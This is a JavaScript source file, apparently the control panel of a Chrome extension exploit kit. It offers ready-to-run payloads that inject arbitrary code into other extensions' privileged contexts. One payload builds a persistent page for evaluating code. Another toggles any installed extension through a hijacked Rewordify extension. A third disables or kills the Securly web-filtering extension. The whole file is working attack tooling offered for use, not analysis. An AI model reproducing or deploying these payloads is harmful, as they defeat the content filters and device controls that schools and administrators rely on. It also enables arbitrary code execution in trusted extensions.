const codebox = document.getElementById("code"),
idbox = document.getElementById("id"),
exploits = document.getElementById("exploits"),
run = document.getElementById("run"),
name = document.getElementById("name");

for (anchor of exploits.children) {
    anchor.addEventListener('click', anchorHandler, false);
}

async function removeFile(name) {
    let prom = new Promise(function(resolve) {
        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, async function (fs) {
            fs.root.getFile(name, { create: true }, function (entry) {
                entry.remove(resolve);
            })
        })
    })

    return await prom;
}

async function writeFile(name,data) {
    let prom = new Promise(function(resolve) {
        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, async function (fs) {
            fs.root.getFile(name, { create: true }, function (entry) {
                entry.createWriter(function (writer) {
                    writer.write(new Blob([data]));
                    writer.onwriteend = function () {
                        resolve(entry)
                    }
                });
            })
        })
    })

    return await prom; // least scuffed js you'll ever see
}

const payloads = {
    'ACE Page': {
        payloader: function(args) {
            let main = async function() {
                function filemain() {
                    function buildBlobWithScript(script) {
                        var fullHTML = `<script src="index.js"></script>`;
                        return new Promise((resolve, reject) => {
                            webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, function (fs) {
                                function writeFileInDirectory(dir, name, data) {
                                    return new Promise((resolve) => {
                                        dir.getFile(name, { create: true }, function (entry) {
                                            entry.createWriter(function (writer) {
                                                writer.write(new Blob([data]));
                                                writer.onwriteend = function () {
                                                    resolve(entry)
                                                }
                                            });
                                        })
                                    })
                                }
                                function removeFileInDirectory(dir, name) {
                                    return new Promise(function (resolve) {
                                        dir.getFile(name, { create: true }, function (entry) {
                                            entry.remove(resolve);
                                        })
                                    })
                                }
                                fs.root.getDirectory('evaluations', { create: true }, async function (entry) {
                                    await removeFileInDirectory(entry, 'index.js');
                                    await writeFileInDirectory(entry, 'index.js', script);
                                    await removeFileInDirectory(entry, 'index.html');
                                    var handle = await writeFileInDirectory(entry, 'index.html', fullHTML);
                                    resolve(handle.toURL());
        
                                }, reject)
                            }, reject)
                        })
                    }
                    document.querySelector('button').onclick = async () => {
                        var url = await buildBlobWithScript(document.querySelector('textarea').value);
                        // unbelievable, why can't we just use open
                        await chrome.tabs.create({ url: url })
                    };
                }
                await removeFile('shim.html');
                await removeFile('shim.js');
                var entry = await writeFile("shim.html", "<textarea></textarea><br/><button>Evaluate</button><script src=\"shim.js\"></script>");
                await writeFile("shim.js", `(${filemain.toString()})()`);
                alert("Save this in your bookmarks: " + entry.toURL());
            }

            return `${removeFile}; ${writeFile}; (${main})()`;
        },
        visible: ["id"],
    },
    'Execute Code': {
        payloader: function(args) {
            return `${removeFile}; ${writeFile}; ${args.code}`;
        },
        visible: ["id","code"],
    },
    'Extension Disabler': {
        payloader: function(args) {
            let main = async function() {
                let editor = function() {
                    document.head.innerHTML = `<style>tr:nth-child(2n){background-color:#f2f2f2}tr:hover{background-color:#ddd}td,th{border:1px solid #ddd;padding:8px;font-family:Arial,Helvetica,sans-serif;border-collapse:collapse}.switch{position:relative;display:inline-block;width:40px;height:23px}.switch input{opacity:0;width:0;height:0}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;-webkit-transition:.4s;transition:.4s}.slider:before{position:absolute;content:"";height:17px;width:17px;left:3px;bottom:3px;background-color:#fff;-webkit-transition:.4s;transition:.4s}input:checked+.slider{background-color:#2196f3}input:focus+.slider{box-shadow:0 0 1px #2196f3}input:checked+.slider:before{-webkit-transform:translateX(17px);-ms-transform:translateX(17px);transform:translateX(17px)}.slider.round{border-radius:23px}.slider.round:before{border-radius:50%}</style>`;
    
                    document.body = document.createElement("body");
                    const table = document.createElement("table");
    
                    function createRow(headers, data) {
                        let row = document.createElement("tr");
    
                        if (headers) {
                            for (header of headers) {
                                let th = document.createElement("th");
    
                                th.scope = "col";
                                th.innerHTML = header;
    
                                row.appendChild(th)
                            }
                        }
                        if (data) {
                            for (dat of data) {
                                let td = document.createElement("td");
    
                                td.append(dat);
    
                                row.appendChild(td)
                            }
                        }
    
                        table.appendChild(row);
                    }
                    createRow(["Enabled","Name","ID","Install Type"])
                    function toggle() {
                        try {
                            let enabled = this.checked;
                            let id = this.parentNode.parentNode.parentNode.children[2].innerHTML;
    
                            if (window.location.href.match(id)) {
                                alert("Extensions shouldn't disable themselves.");
                                this.checked = true;
                                return;
                            }
    
                            chrome.management.setEnabled(id,enabled);
                        } catch(err) {
                            alert(err)
                        }
                    }
                    chrome.management.getAll(function(exts){
                        exts.forEach(function(extension){
                            try {
                                let label = document.createElement("label");
                            label.classList.add("switch");
    
                            let cb = document.createElement("input");
                            cb.type = "checkbox";
                            cb.checked = extension.enabled;
                            label.appendChild(cb);
    
                            let span = document.createElement("span");
                            span.classList.add("slider");
                            span.classList.add("round");
                            label.appendChild(span);
    
                            cb.onclick = toggle;
    
                            createRow(undefined,[label,extension.name,extension.id,extension.installType])
                            } catch(err) {
                                alert(err)
                            }
                        });
                    })
                    document.body.appendChild(table);
                }

                try {
                    await removeFile("extedit.js");
                    await removeFile("extedit.html");

                    await writeFile("extedit.js",`(${editor})();`);
                    let entry = await writeFile("extedit.html",`<script src="extedit.js"></script>`);
                    alert("Save this in your bookmarks: " + entry.toURL());
                } catch (err) {
                    alert(err)
                }
            }

            return `${removeFile}; ${writeFile}; (${main})()`
        },
        prefix: `chrome-extension://inoeonmfapjbbkmdafoankkfajkcphgd`,
        open: `chrome-extension://inoeonmfapjbbkmdafoankkfajkcphgd/rewordify.html`,
    },
    'Securly Disabler': {
        payloader: function(args) {
            let main = async function() {
                let editor = function() {
                    document.write(`
                    <h1 id='stat'>Securly is currently enabled</h1>
                    <button id="dis">Perm Disable Securly</button>
                    <button id="en">Re-enable Securly</button>
                    <br><br>
                    <button id="kill">Kill Until Reboot</button>
                    `)

                    alert(localStorage.cluster);
                    if (typeof(localStorage.cluster) == "string" && !localStorage.cluster.startsWith("https://")) {
                        stat.innerText = "Securly is currently disabled"
                    }

                    dis.onclick = function() {
                        localStorage.clear();
                        sessionStorage.clear();

                        localStorage.setItem("cluster","AVOID_OS,99999999999");
                        chrome.runtime.reload();
                    }
                    en.onclick = function() {
                        localStorage.clear();
                        localStorage.setItem("cluster",undefined); // just in case
                        chrome.runtime.reload();
                    }
                    kill.onclick = function() {
                        chrome.extension.getBackgroundPage().close();
                    }
                }

                try {
                    await removeFile("creativefilename.js");
                    await removeFile("creativefilename.html");
                    await writeFile("creativefilename.js",`(${editor})();`);
                    let entry = await writeFile("creativefilename.html",`<script src="creativefilename.js"></script>`);
                    alert("Save this in your bookmarks: " + entry.toURL());
                } catch (err) {
                    alert(err)
                }
            }

            return `${removeFile}; ${writeFile}; (${main})()`
        },
        prefix: `chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg`,
        open: `chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/_generated_background_page.html`,
    },
}

function anchorHandler() {
    name.innerText = this.innerText;

    let pl = payloads[name.innerText];
    if (!pl) return;

    idbox.style.display = (pl.visible && pl.visible.includes("id")) ? "unset" : "none";
    codebox.style.display = (pl.visible && pl.visible.includes("code")) ? "unset" : "none";
}

run.onclick = async function() {
    let pl = payloads[name.innerText];
    if (!pl) return;

    let args = {code: codebox.value,id: idbox.value}
    let payload = pl.payloader(args);

    let result = await chrome.runtime.sendMessage({payload: payload, prefix: pl.prefix || idbox.value, open: pl.open});
}